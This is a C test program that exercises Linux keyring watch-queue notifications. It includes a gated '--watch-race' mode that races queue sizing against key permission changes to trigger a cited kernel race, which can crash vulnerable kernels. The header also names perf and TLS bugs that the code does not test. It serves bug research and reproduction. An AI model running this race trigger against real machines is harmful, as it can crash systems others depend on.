/*
 * Linux kernel concurrency: cumulative, real-API investigation.
 * Compiles as one file: gcc -O2 -Wall -Wextra -Werror -pthread FILE.c -o demo
 * No kernel modules, libraries, or external test helpers required.
 * Each successive version incorporates EVERY earlier executable test.
 *
 * Evidence / fixed upstream bugs:
 * 2026 watch_queue_set_size/post_one_notification publication race:
 *   5e531d62f1f8834faf7a4eed0d41105cf6570a8f
 *   https://lkml.iu.edu/hypermail/linux/kernel/2610.1/04603.html
 * 2022 post_one_notification/pipe_read release-acquire race:
 *   2ed147f015af2b48f41c6f0b6746aa9ea85c19f3
 *   https://lkml.rescloud.iu.edu/2203.1/07747.html
 * 2026 perf_mmap/SET_OUTPUT ring buffer lifetime race:
 *   77de62ad3de3967818c3dbe656b7336ebee461d2
 *   https://lkml.iu.edu/2603.0/09293.html
 * 2020 tls_sw_recvmsg/tls_decrypt_done completion race:
 *   0cada33241d9de205522e3858b18e506ca5cce2c
 *   https://lists.openwall.net/netdev/2020/05/22/305
 *
 * Safe default exercises real kernel paths. It does NOT imply a bug exists
 * on the executing kernel. A historical fix can already be present.
 * --watch-race is intentionally dangerous on VULNERABLE kernels: use only in
 * a disposable virtual machine and only with --vm-i-accept-crash.
 */
#define _GNU_SOURCE
#include <errno.h>
#include <linux/keyctl.h>
#include <linux/watch_queue.h>
#include <poll.h>
#include <pthread.h>
#include <stdatomic.h>
#include <sched.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/utsname.h>
#include <unistd.h>

static long kctl(unsigned int command, unsigned long a, unsigned long b,
                 unsigned long c, unsigned long d) {
    return syscall(SYS_keyctl, command, a, b, c, d);
}

static long new_key(const char *name) {
    const char payload[] = "kernel-watch-integration";
    return syscall(SYS_add_key, "user", name, payload, sizeof(payload),
                   KEY_SPEC_PROCESS_KEYRING);
}

static int make_notification_pipe(int fds[2]) {
    /* A notification pipe uses the ordinary pipe syscalls but has kernel
       producer semantics. The writer end is passed to KEYCTL_WATCH_KEY. */
    return pipe2(fds, O_NOTIFICATION_PIPE | O_NONBLOCK | O_CLOEXEC);
}

static void print_notification_records(int fd) {
    unsigned char raw[4096];
    struct pollfd pfd = { .fd = fd, .events = POLLIN };
    int ready = poll(&pfd, 1, 1000);
    if (ready <= 0) {
        printf("watch: no record within one second (poll=%d, errno=%d)\n",
               ready, ready < 0 ? errno : 0);
        return;
    }
    ssize_t count = read(fd, raw, sizeof(raw));
    if (count < 0) {
        printf("watch: read errno=%d (%s)\n", errno, strerror(errno));
        return;
    }
    for (size_t offset = 0; offset + sizeof(struct watch_notification) <= (size_t)count;) {
        struct watch_notification n;
        memcpy(&n, raw + offset, sizeof(n));
        size_t len = n.info & WATCH_INFO_LENGTH;
        if (len < sizeof(n) || offset + len > (size_t)count) {
            printf("watch: malformed record at %zu len=%zu total=%zd\n", offset, len, count);
            break;
        }
        printf("watch: kernel record type=%u subtype=%u id=%u length=%zu\n",
               n.type, n.subtype, (n.info & WATCH_INFO_ID) >> WATCH_INFO_ID__SHIFT, len);
        if (n.type == WATCH_TYPE_KEY_NOTIFY && len >= sizeof(struct key_notification)) {
            struct key_notification kn;
            memcpy(&kn, raw + offset, sizeof(kn));
            printf("watch: source key=%u aux=%u\n", kn.key_id, kn.aux);
        }
        offset += len;
    }
}

static void probe_watch(void) {
    char name[80];
    snprintf(name, sizeof(name), "cslab-watch-%ld", (long)getpid());
    long key = new_key(name);
    if (key < 0) {
        printf("watch: add_key unavailable: %s\n", strerror(errno));
        return;
    }
    int fds[2] = { -1, -1 };
    if (make_notification_pipe(fds) < 0) {
        printf("watch: notification pipe unavailable: %s\n", strerror(errno));
        goto out_key;
    }
    if (ioctl(fds[1], IOC_WATCH_QUEUE_SET_SIZE, 4) < 0) {
        printf("watch: queue sizing unavailable: %s\n", strerror(errno));
        goto out_fds;
    }
    if (kctl(KEYCTL_WATCH_KEY, (unsigned long)key, (unsigned long)fds[1], 17, 0) < 0) {
        printf("watch: KEYCTL_WATCH_KEY unavailable: %s\n", strerror(errno));
        goto out_fds;
    }
    /* This operates on an actual kernel key and posts WATCH_TYPE_KEY_NOTIFY. */
    if (kctl(KEYCTL_SETPERM, (unsigned long)key, 0x3f3f0000UL, 0, 0) < 0)
        printf("watch: KEYCTL_SETPERM failed: %s\n", strerror(errno));
    print_notification_records(fds[0]);
out_fds:
    close(fds[0]);
    close(fds[1]);
out_key:
    (void)kctl(KEYCTL_INVALIDATE, (unsigned long)key, 0, 0, 0);
}

struct watch_race_args {
    atomic_bool *start;
    long key;
    int fd;
    int action;
    int result;
    int error;
};

static void *watch_racer(void *arg) {
    struct watch_race_args *a = arg;
    /* Main thread creates a subscription BEFORE queue sizing. The race is
       the one described in the 2026 LKML report, not a synthetic structure. */
    while (!atomic_load_explicit(a->start, memory_order_acquire))
        sched_yield();
    if (a->action == 0)
        a->result = ioctl(a->fd, IOC_WATCH_QUEUE_SET_SIZE, 4);
    else
        a->result = (int)kctl(KEYCTL_SETPERM, (unsigned long)a->key,
                              0x3f3f0000UL, 0, 0);
    a->error = errno;
    return NULL;
}

static void probe_watch_race(void) {
    printf("watch-race: dangerous mode, run ONLY inside a disposable VM.\n");
    unsigned failures = 0;
    for (unsigned i = 0; i < 128; i++) {
        char name[80];
        snprintf(name, sizeof(name), "cslab-race-%ld-%u", (long)getpid(), i);
        long key = new_key(name);
        int fds[2] = { -1, -1 };
        if (key < 0 || make_notification_pipe(fds) < 0) {
            failures++;
            if (key >= 0) (void)kctl(KEYCTL_INVALIDATE, (unsigned long)key, 0, 0, 0);
            break;
        }
        if (kctl(KEYCTL_WATCH_KEY, (unsigned long)key, (unsigned long)fds[1], 17, 0) < 0) {
            printf("watch-race: watch BEFORE size rejected: %s\n", strerror(errno));
            failures++;
            close(fds[0]); close(fds[1]);
            (void)kctl(KEYCTL_INVALIDATE, (unsigned long)key, 0, 0, 0);
            break;
        }
        atomic_bool start_flag = ATOMIC_VAR_INIT(false);
        struct watch_race_args a = { .start=&start_flag, .key=key, .fd=fds[1], .action=0 },
                               b = { .start=&start_flag, .key=key, .fd=fds[1], .action=1 };
        pthread_t t1, t2;
        int e1 = pthread_create(&t1, NULL, watch_racer, &a);
        int e2 = e1 ? e1 : pthread_create(&t2, NULL, watch_racer, &b);
        if (e1 || e2) {
            /* Release any started thread and join it before freeing storage. */
            atomic_store_explicit(&start_flag, true, memory_order_release);
            if (!e1) pthread_join(t1, NULL);
            printf("watch-race: cannot create threads; stopping\n");
            failures++;
            close(fds[0]); close(fds[1]);
            (void)kctl(KEYCTL_INVALIDATE, (unsigned long)key, 0, 0, 0);
            break;
        }
        atomic_store_explicit(&start_flag, true, memory_order_release);
        pthread_join(t1, NULL);
        pthread_join(t2, NULL);
        if (a.result < 0 || b.result < 0) failures++;
        close(fds[0]); close(fds[1]);
        (void)kctl(KEYCTL_INVALIDATE, (unsigned long)key, 0, 0, 0);
    }
    printf("watch-race: 128 attempts requested, syscall failures=%u; no crash is NOT proof of safety\n", failures);
}

static void usage(const char *exe) {
    fprintf(stderr, "Usage: %s --watch [--watch-race --vm-i-accept-crash]\n", exe);
    fprintf(stderr, "Never use --watch-race on a host you cannot afford to crash.\n");
}

int main(int argc, char **argv) {
    struct utsname os;
    if (uname(&os) == 0) printf("kernel: %s %s %s\n", os.sysname, os.release, os.machine);
    if (argc == 1) { usage(argv[0]); return 2; }
    bool accept_crash = false;
    for (int i = 1; i < argc; i++) if (strcmp(argv[i], "--vm-i-accept-crash") == 0) accept_crash = true;
    int ran = 0;
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--watch") == 0) { probe_watch(); ran++; }
        else if (strcmp(argv[i], "--watch-race") == 0) {
            if (!accept_crash) { fputs("REFUSED: --watch-race requires --vm-i-accept-crash\n", stderr); return 2; }
            probe_watch_race(); ran++;
        }
        else if (strcmp(argv[i], "--vm-i-accept-crash") != 0) {
            fprintf(stderr, "Unknown option: %s\n", argv[i]); usage(argv[0]); return 2;
        }
    }
    return ran ? 0 : 2;
}
